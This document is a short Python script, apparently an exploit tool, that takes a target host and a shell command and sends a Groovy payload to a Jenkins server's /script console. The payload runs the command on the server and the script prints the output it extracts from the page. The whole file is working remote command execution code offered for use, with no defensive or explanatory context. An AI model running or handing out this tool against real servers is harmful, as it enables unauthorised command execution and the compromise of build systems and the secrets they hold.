#!/usr/bin/python3

import os, sys, argparse, requests, re
from lxml.html import fromstring
requests.packages.urllib3.disable_warnings()

parser = argparse.ArgumentParser(description="My Args")
parser.add_argument('-i', dest='host', required=True, type=str)
parser.add_argument('-c', dest="command", required=True, type=str)
args = parser.parse_args()

def post_req(host):
    url = "http://" + host + "/script"
    cmd = 'proc = \"' + command + '\".execute()\nproc.text'
    payload = {"script": cmd, "": "xt"}
    response = requests.post(url, data=payload)
    root = fromstring(response.content)
    for results in root.findall('.//pre'):
        new_results = results.text.replace("println(Jenkins.instance.pluginManager.plugins)","")
        final_results = new_results.replace("Result: ","")
        print(final_results)

if __name__ == "__main__":
    host = args.host
    command = args.command
    post_req(host)
